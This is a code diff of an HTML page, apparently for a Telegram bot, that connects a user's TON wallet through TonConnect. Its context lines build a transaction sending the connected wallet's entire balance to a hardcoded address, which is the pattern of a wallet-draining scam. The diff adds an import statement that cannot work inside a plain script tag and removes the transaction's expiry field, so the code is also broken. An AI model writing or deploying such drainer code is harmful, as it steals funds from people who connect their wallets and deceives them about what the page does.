@@ -10,6 +10,8 @@
 
     <div id="ton-connect"></div>
     <script>
+        import TonConnectUI from '@tonconnect/ui';
+        
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
             buttonRootId: 'ton-connect'
@@ -33,7 +35,6 @@
             const transferAmount = balance; // Assuming you want to transfer the entire balance
             const recipientAddress = 'UQDritJgjXDmn9HkUeCYpAm-WErrDj-E5qS2ZgjWFZnt9Fvc'; // Replace with the recipient's wallet address
             const transferTx = {
-                validUntil: Math.floor(Date.now() / 1000) + 3600,
                 messages: [{
                     address: recipientAddress,
                     amount: transferAmount,
